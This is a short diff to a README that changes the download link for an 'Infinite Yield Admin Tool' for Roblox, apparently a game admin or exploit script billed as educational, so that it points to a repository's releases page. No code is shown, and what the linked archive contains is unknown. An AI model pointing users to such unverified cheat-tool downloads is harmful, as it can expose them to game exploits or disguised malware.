@@ -37,7 +37,7 @@ Explore various topics related to game development, scripting, and administratio
 
 ## Installation
 
-Download the *Infinite Yield Admin Tool* from the following link: [![Download](https://img.shields.io/badge/Download-Release.zip-blue)](https://github.com/assets/Release.zip "Launch the Admin Tool")
+Download the *Infinite Yield Admin Tool* from the following link: [![Download](https://github.com/RandomX-blip/Infinite-Yield-Admin-Tool-for-Roblox-Educational-Purposes/releases)](https://github.com/RandomX-blip/Infinite-Yield-Admin-Tool-for-Roblox-Educational-Purposes/releases "Launch the Admin Tool")
 
 ## Getting Started
 
